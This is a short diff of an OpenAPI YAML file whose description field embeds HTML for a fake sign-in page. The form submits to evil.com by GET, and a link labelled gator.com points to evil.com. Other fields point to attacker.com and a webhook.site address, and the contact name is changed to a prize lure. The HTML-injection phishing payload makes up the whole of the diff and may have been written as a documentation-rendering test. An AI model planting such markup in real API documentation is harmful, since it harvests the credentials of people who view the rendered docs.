@@ -3,7 +3,7 @@ info:
   version: 1.0.0
   title: "Login Page - Fake Login Page"
   description: |
-    Checkout <h1>we</h1> move our service to
+    Checkout we move our service to
     <a href="https://www.evil.com">gator.com</a>
     <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
@@ -22,7 +22,7 @@ info:
     </div>
   termsOfService: "https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428"
   contact:
-    name: "API Support"
+    name: "Gator to celebrate spin & win"
     url: "https://attacker.com/"
     email: "bilalabbasuk@gmail.com"
 paths:
@@ -50,6 +50,7 @@ paths:
           description: Invalid credentials or missing parameters
         '500':
           description: Internal server error
+
 
 
 
